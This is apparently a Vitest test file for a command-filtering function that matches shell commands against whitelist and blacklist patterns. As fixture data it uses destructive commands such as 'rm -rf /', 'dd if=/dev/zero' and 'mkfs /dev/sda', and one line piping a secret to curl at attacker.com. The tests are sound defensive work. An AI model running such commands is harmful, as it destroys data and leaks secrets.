import { describe, expect, it } from 'vitest'
import { patternMatcher } from './matcher.js'

describe('patternMatcher', () => {
  describe('whitelist priority', () => {
    it('returns null when blacklist is empty', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: [],
        })
      ).toBeNull()
    })

    it('returns null when whitelist is empty and command does not match blacklist', async () => {
      expect(
        await patternMatcher({
          command: 'ls -la',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm', 'dd'],
        })
      ).toBeNull()
    })

    it('returns null when both lists are empty', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /',
          priority: 'whitelist',
          whitelist: [],
          blacklist: [],
        })
      ).toBeNull()
    })

    it('returns the matching blacklist pattern', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('returns the exact blacklisted pattern from a list', async () => {
      expect(
        await patternMatcher({
          command: 'dd if=/dev/zero',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm', 'dd', 'mkfs'],
        })
      ).toBe('dd')
    })

    it('returns null when blacklisted command is also whitelisted by exact match', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /tmp',
          priority: 'whitelist',
          whitelist: ['rm -rf /tmp'],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('returns null when blacklisted command is whitelisted by prefix', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev --port 3000',
          priority: 'whitelist',
          whitelist: ['npm run dev'],
          blacklist: ['npm run dev'],
        })
      ).toBeNull()
    })

    it('blocks blacklisted command whose prefix is whitelisted but the full command is not', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /tmp/cache',
          priority: 'whitelist',
          whitelist: ['rm -rf /tmp'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('blocks blacklisted command in a chain when another command is whitelisted', async () => {
      expect(
        await patternMatcher({
          command: 'ls && rm -rf /',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('returns null when every command in the chain is whitelisted', async () => {
      expect(
        await patternMatcher({
          command: 'ls && pwd && echo done',
          priority: 'whitelist',
          whitelist: ['ls', 'pwd', 'echo'],
          blacklist: ['rm', 'dd'],
        })
      ).toBeNull()
    })

    it('returns the first non-whitelisted blacklist match in a multi-pattern chain', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf / && dd if=/dev/zero',
          priority: 'whitelist',
          whitelist: ['rm'],
          blacklist: ['rm', 'dd'],
        })
      ).toBe('dd')
    })

    it('returns the first blacklist match when multiple patterns match the same command', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm', 'rm -rf'],
        })
      ).toBe('rm')
    })

    it('returns null when blacklist pattern is in the whitelist and command matches it', async () => {
      expect(
        await patternMatcher({
          command: 'ls',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['ls'],
        })
      ).toBeNull()
    })

    it('blocks when the command matches blacklist but the only whitelist pattern is unrelated', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /',
          priority: 'whitelist',
          whitelist: ['echo'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })
  })

  describe('blacklist priority', () => {
    it('returns null when whitelist is empty', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /',
          priority: 'blacklist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('returns null when both lists are empty', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /',
          priority: 'blacklist',
          whitelist: [],
          blacklist: [],
        })
      ).toBeNull()
    })

    it('returns null when whitelisted command is not blacklisted', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev',
          priority: 'blacklist',
          whitelist: ['npm run dev'],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('returns null when whitelisted command with arguments is not blacklisted', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev --port 3000',
          priority: 'blacklist',
          whitelist: ['npm run dev'],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('returns the blacklist pattern when whitelisted command is also blacklisted', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev',
          priority: 'blacklist',
          whitelist: ['npm run dev'],
          blacklist: ['npm run dev'],
        })
      ).toBe('npm run dev')
    })

    it('returns the blacklist pattern when whitelisted command is blocked by a different blacklist pattern', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev',
          priority: 'blacklist',
          whitelist: ['npm run dev'],
          blacklist: ['npm'],
        })
      ).toBe('npm')
    })

    it('returns null for non-whitelisted blacklisted commands', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /',
          priority: 'blacklist',
          whitelist: ['npm run dev'],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('returns null when multiple whitelisted commands are not blacklisted', async () => {
      expect(
        await patternMatcher({
          command: 'npm test && npm run build',
          priority: 'blacklist',
          whitelist: ['npm test', 'npm run build'],
          blacklist: ['npm run dev'],
        })
      ).toBeNull()
    })

    it('returns the blacklist pattern when one whitelisted command is blacklisted among others', async () => {
      expect(
        await patternMatcher({
          command: 'npm test && npm run dev',
          priority: 'blacklist',
          whitelist: ['npm test', 'npm run dev'],
          blacklist: ['npm run dev'],
        })
      ).toBe('npm run dev')
    })

    it('returns the first blacklist match found in a whitelisted command', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev',
          priority: 'blacklist',
          whitelist: ['npm run dev'],
          blacklist: ['npm', 'npm run dev'],
        })
      ).toBe('npm')
    })

    it('returns null for command that does not match any whitelist pattern', async () => {
      expect(
        await patternMatcher({
          command: 'echo hello',
          priority: 'blacklist',
          whitelist: ['npm run dev'],
          blacklist: ['echo'],
        })
      ).toBeNull()
    })
  })

  describe('case insensitivity', () => {
    it('lowercases uppercase command before matching', async () => {
      expect(
        await patternMatcher({
          command: 'RM -RF /',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('lowercases mixed case command before matching', async () => {
      expect(
        await patternMatcher({
          command: 'Rm -Rf /',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('returns null for mixed case non-matching command', async () => {
      expect(
        await patternMatcher({
          command: 'LS -LA',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('matches uppercase command against lowercase multi-word pattern', async () => {
      expect(
        await patternMatcher({
          command: 'NPM RUN DEV',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npm run dev'],
        })
      ).toBe('npm run dev')
    })

    it('does not match lowercase command when pattern is uppercase', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['RM'],
        })
      ).toBeNull()
    })
  })

  describe('whitespace normalization', () => {
    it('collapses multiple spaces into one', async () => {
      expect(
        await patternMatcher({
          command: 'rm    -rf    /',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('treats tabs as whitespace', async () => {
      expect(
        await patternMatcher({
          command: 'rm\t-\trf\t/',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('treats newlines as whitespace', async () => {
      expect(
        await patternMatcher({
          command: 'rm\n-\nrf\n/',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('treats carriage returns as whitespace', async () => {
      expect(
        await patternMatcher({
          command: 'rm\r-\rrf\r/',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('treats mixed whitespace as a single separator', async () => {
      expect(
        await patternMatcher({
          command: 'rm \t\n - \t\n rf',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('trims leading and trailing whitespace around a command', async () => {
      expect(
        await patternMatcher({
          command: '   rm   ',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('trims whitespace around each token after splitting', async () => {
      expect(
        await patternMatcher({
          command: '   rm   ;   ls   ',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('normalizes whitespace inside multi-word pattern targets', async () => {
      expect(
        await patternMatcher({
          command: 'npm   run   dev',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npm run dev'],
        })
      ).toBe('npm run dev')
    })
  })

  describe('command splitting by semicolon', () => {
    it('splits on a single semicolon', async () => {
      expect(
        await patternMatcher({
          command: 'ls; rm -rf /',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('splits on a semicolon with spaces', async () => {
      expect(
        await patternMatcher({
          command: 'ls ; rm -rf /',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('returns null when both sub-commands are clean', async () => {
      expect(
        await patternMatcher({
          command: 'ls; echo hello',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('blocks the offending sub-command in a long chain', async () => {
      expect(
        await patternMatcher({
          command: 'ls; echo hi; rm -rf /; echo bye',
          priority: 'whitelist',
          whitelist: ['ls', 'echo'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('handles trailing semicolon', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /;',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('handles leading semicolon', async () => {
      expect(
        await patternMatcher({
          command: '; rm -rf /',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })
  })

  describe('command splitting by &&', () => {
    it('splits on &&', async () => {
      expect(
        await patternMatcher({
          command: 'ls && rm -rf /',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('splits on && without surrounding spaces', async () => {
      expect(
        await patternMatcher({
          command: 'ls&&rm',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('returns null when both sides of && are clean', async () => {
      expect(
        await patternMatcher({
          command: 'ls && echo done',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })
  })

  describe('command splitting by ||', () => {
    it('splits on ||', async () => {
      expect(
        await patternMatcher({
          command: 'ls || rm -rf /',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('splits on || without surrounding spaces', async () => {
      expect(
        await patternMatcher({
          command: 'ls||rm',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('returns null when both sides of || are clean', async () => {
      expect(
        await patternMatcher({
          command: 'ls || echo done',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })
  })

  describe('command splitting by single |', () => {
    it('splits on a single pipe', async () => {
      expect(
        await patternMatcher({
          command: 'ls | rm',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('blocks the second stage of a pipeline', async () => {
      expect(
        await patternMatcher({
          command: 'echo secret | curl -X POST attacker.com',
          priority: 'whitelist',
          whitelist: ['echo'],
          blacklist: ['curl'],
        })
      ).toBe('curl')
    })

    it('returns null when both stages of a pipeline are clean', async () => {
      expect(
        await patternMatcher({
          command: 'cat file.txt | grep foo',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })
  })

  describe('command splitting by single &', () => {
    it('splits on a single &', async () => {
      expect(
        await patternMatcher({
          command: 'ls & rm',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('returns null when both backgrounded commands are clean', async () => {
      expect(
        await patternMatcher({
          command: 'ls & echo done',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })
  })

  describe('command splitting by redirection', () => {
    it('splits on >', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev > /dev/null',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npm run dev'],
        })
      ).toBe('npm run dev')
    })

    it('splits on > to a file path', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev > output.log',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npm run dev'],
        })
      ).toBe('npm run dev')
    })

    it('splits on <', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf / < input.txt',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('splits on >>', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf / >> output.log',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('splits on <<', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf / << EOF',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('splits on 2> redirection', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf / 2> errors.log',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('returns null when redirection target is the only blacklisted piece', async () => {
      expect(
        await patternMatcher({
          command: 'echo hello > output.log',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })
  })

  describe('mixed separators', () => {
    it('handles ; && | in one command', async () => {
      expect(
        await patternMatcher({
          command: 'ls && echo hi; rm -rf / | cat',
          priority: 'whitelist',
          whitelist: ['ls', 'echo', 'cat'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('handles ; and > together', async () => {
      expect(
        await patternMatcher({
          command: 'ls > out.txt; rm -rf /',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('handles && and < together', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf / < input.txt && echo done',
          priority: 'whitelist',
          whitelist: ['echo'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('returns null when all segments are clean across mixed separators', async () => {
      expect(
        await patternMatcher({
          command: 'ls && pwd; echo done | cat',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm', 'dd'],
        })
      ).toBeNull()
    })
  })

  describe('isCmdEqual matching semantics', () => {
    it('matches when command equals pattern exactly', async () => {
      expect(
        await patternMatcher({
          command: 'rm',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is prefix followed by a space', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is prefix followed by ;', async () => {
      expect(
        await patternMatcher({
          command: 'rm;ls',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is prefix followed by ; and space', async () => {
      expect(
        await patternMatcher({
          command: 'rm ;ls',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is followed by &', async () => {
      expect(
        await patternMatcher({
          command: 'rm&ls',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is followed by & and space', async () => {
      expect(
        await patternMatcher({
          command: 'rm &ls',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is followed by |', async () => {
      expect(
        await patternMatcher({
          command: 'rm|ls',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is followed by <', async () => {
      expect(
        await patternMatcher({
          command: 'rm<file',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is followed by >', async () => {
      expect(
        await patternMatcher({
          command: 'rm>file',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is preceded by ;', async () => {
      expect(
        await patternMatcher({
          command: 'ls;rm',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is preceded by ; and space', async () => {
      expect(
        await patternMatcher({
          command: 'ls; rm',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is preceded by &&', async () => {
      expect(
        await patternMatcher({
          command: 'ls&&rm',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is preceded by ||', async () => {
      expect(
        await patternMatcher({
          command: 'ls||rm',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is preceded by <', async () => {
      expect(
        await patternMatcher({
          command: 'cat<rm',
          priority: 'whitelist',
          whitelist: ['cat'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches when pattern is preceded by >', async () => {
      expect(
        await patternMatcher({
          command: 'cat>rm',
          priority: 'whitelist',
          whitelist: ['cat'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches multi-word pattern with trailing arguments', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev --watch',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npm run dev'],
        })
      ).toBe('npm run dev')
    })

    it('does not match pattern embedded in a command word', async () => {
      expect(
        await patternMatcher({
          command: 'echo rm',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('does not match pattern as substring inside a longer word', async () => {
      expect(
        await patternMatcher({
          command: 'farm',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('does not match pattern as prefix of a longer word without a space', async () => {
      expect(
        await patternMatcher({
          command: 'rmfoo',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('does not match partial multi-word pattern', async () => {
      expect(
        await patternMatcher({
          command: 'npm run development',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npm run dev'],
        })
      ).toBeNull()
    })

    it('matches when command has arguments equal to pattern without trailing space', async () => {
      expect(
        await patternMatcher({
          command: 'rm -rf /',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm -rf'],
        })
      ).toBe('rm -rf')
    })

    it('does not match when pattern is longer than the command', async () => {
      expect(
        await patternMatcher({
          command: 'rm',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm -rf'],
        })
      ).toBeNull()
    })
  })

  describe('error handling', () => {
    it('throws for an unknown priority string', async () => {
      await expect(
        patternMatcher({
          command: 'ls',
          priority: 'invalid' as 'whitelist',
          whitelist: [],
          blacklist: [],
        })
      ).rejects.toThrow(
        'Unknown priority: "invalid". Expected "blacklist" or "whitelist".'
      )
    })

    it('throws for an empty priority string', async () => {
      await expect(
        patternMatcher({
          command: 'ls',
          priority: '' as 'whitelist',
          whitelist: [],
          blacklist: [],
        })
      ).rejects.toThrow(
        'Unknown priority: "". Expected "blacklist" or "whitelist".'
      )
    })

    it('throws for an uppercase priority string', async () => {
      await expect(
        patternMatcher({
          command: 'ls',
          priority: 'WHITELIST' as 'whitelist',
          whitelist: [],
          blacklist: [],
        })
      ).rejects.toThrow(
        'Unknown priority: "WHITELIST". Expected "blacklist" or "whitelist".'
      )
    })

    it('throws for a priority string with trailing space', async () => {
      await expect(
        patternMatcher({
          command: 'ls',
          priority: 'whitelist ' as 'whitelist',
          whitelist: [],
          blacklist: [],
        })
      ).rejects.toThrow(
        'Unknown priority: "whitelist ". Expected "blacklist" or "whitelist".'
      )
    })
  })

  describe('empty and whitespace-only commands', () => {
    it('returns null for an empty command', async () => {
      expect(
        await patternMatcher({
          command: '',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('returns null for a whitespace-only command', async () => {
      expect(
        await patternMatcher({
          command: '   ',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('returns null for a tab-only command', async () => {
      expect(
        await patternMatcher({
          command: '\t\t',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('returns null for a separator-only command', async () => {
      expect(
        await patternMatcher({
          command: ';;;',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })

    it('returns null for a command of only separators and whitespace', async () => {
      expect(
        await patternMatcher({
          command: ' ; && ; ',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBeNull()
    })
  })

  describe('real-world dev server commands', () => {
    it('blocks npm run dev', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npm run dev'],
        })
      ).toBe('npm run dev')
    })

    it('blocks npm run dev with arguments', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev --host 0.0.0.0',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npm run dev'],
        })
      ).toBe('npm run dev')
    })

    it('blocks yarn start', async () => {
      expect(
        await patternMatcher({
          command: 'yarn start',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['yarn start'],
        })
      ).toBe('yarn start')
    })

    it('blocks pnpm serve', async () => {
      expect(
        await patternMatcher({
          command: 'pnpm serve',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['pnpm serve'],
        })
      ).toBe('pnpm serve')
    })

    it('blocks bun dev', async () => {
      expect(
        await patternMatcher({
          command: 'bun dev',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['bun dev'],
        })
      ).toBe('bun dev')
    })

    it('blocks npx vite', async () => {
      expect(
        await patternMatcher({
          command: 'npx vite',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npx vite'],
        })
      ).toBe('npx vite')
    })

    it('blocks npx next', async () => {
      expect(
        await patternMatcher({
          command: 'npx next',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npx next'],
        })
      ).toBe('npx next')
    })

    it('blocks npx nodemon', async () => {
      expect(
        await patternMatcher({
          command: 'npx nodemon',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npx nodemon'],
        })
      ).toBe('npx nodemon')
    })

    it('blocks npx tsx watch', async () => {
      expect(
        await patternMatcher({
          command: 'npx tsx watch src/index.ts',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npx tsx watch'],
        })
      ).toBe('npx tsx watch')
    })

    it('blocks node --watch', async () => {
      expect(
        await patternMatcher({
          command: 'node --watch app.js',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['node --watch'],
        })
      ).toBe('node --watch')
    })

    it('blocks pm2 start', async () => {
      expect(
        await patternMatcher({
          command: 'pm2 start app.js',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['pm2 start'],
        })
      ).toBe('pm2 start')
    })

    it('allows npm test which is not in the blacklist', async () => {
      expect(
        await patternMatcher({
          command: 'npm test',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npm run dev'],
        })
      ).toBeNull()
    })

    it('allows echo hello which is not in the blacklist', async () => {
      expect(
        await patternMatcher({
          command: 'echo hello',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npm run dev'],
        })
      ).toBeNull()
    })

    it('allows ls -la which is not in the blacklist', async () => {
      expect(
        await patternMatcher({
          command: 'ls -la',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npm run dev'],
        })
      ).toBeNull()
    })

    it('allows npx vitest when npx vitest is whitelisted and blacklisted', async () => {
      expect(
        await patternMatcher({
          command: 'npx vitest run',
          priority: 'whitelist',
          whitelist: ['npx vitest'],
          blacklist: ['npx vitest'],
        })
      ).toBeNull()
    })

    it('blocks npm run dev even when other commands are whitelisted', async () => {
      expect(
        await patternMatcher({
          command: 'npx vitest && npm run dev',
          priority: 'whitelist',
          whitelist: ['npx vitest'],
          blacklist: ['npm run dev'],
        })
      ).toBe('npm run dev')
    })
  })

  describe('combined and complex scenarios', () => {
    it('blocks the first non-whitelisted command in a long chain', async () => {
      expect(
        await patternMatcher({
          command: 'ls && pwd && rm -rf / && echo done',
          priority: 'whitelist',
          whitelist: ['ls', 'pwd', 'echo'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('returns null when the entire chain is whitelisted', async () => {
      expect(
        await patternMatcher({
          command: 'ls && pwd && echo done',
          priority: 'whitelist',
          whitelist: ['ls', 'pwd', 'echo'],
          blacklist: ['rm', 'dd'],
        })
      ).toBeNull()
    })

    it('handles redirection combined with chained commands', async () => {
      expect(
        await patternMatcher({
          command: 'ls > out.txt && rm -rf /',
          priority: 'whitelist',
          whitelist: ['ls'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('matches command wrapped in surrounding whitespace', async () => {
      expect(
        await patternMatcher({
          command: '  rm  -rf  /  ',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('blocks nested blacklisted commands inside subshells with redirection', async () => {
      expect(
        await patternMatcher({
          command: 'echo start > log.txt && rm -rf / 2> err.txt',
          priority: 'whitelist',
          whitelist: ['echo'],
          blacklist: ['rm'],
        })
      ).toBe('rm')
    })

    it('returns null when a whitelisted command is later blacklisted by a different rule', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev',
          priority: 'whitelist',
          whitelist: ['npm run dev'],
          blacklist: ['npm'],
        })
      ).toBeNull()
    })

    it('blocks the same command in two different blacklist patterns, returning the first one', async () => {
      expect(
        await patternMatcher({
          command: 'npm run dev',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['npm', 'npm run dev'],
        })
      ).toBe('npm')
    })

    it('handles a list of three blacklist patterns where only the third matches', async () => {
      expect(
        await patternMatcher({
          command: 'mkfs /dev/sda',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['rm', 'dd', 'mkfs'],
        })
      ).toBe('mkfs')
    })

    it('does not match a pattern that is a substring of a longer word', async () => {
      expect(
        await patternMatcher({
          command: 'mkfs.ext4 /dev/sda',
          priority: 'whitelist',
          whitelist: [],
          blacklist: ['mkfs'],
        })
      ).toBeNull()
    })
  })
})
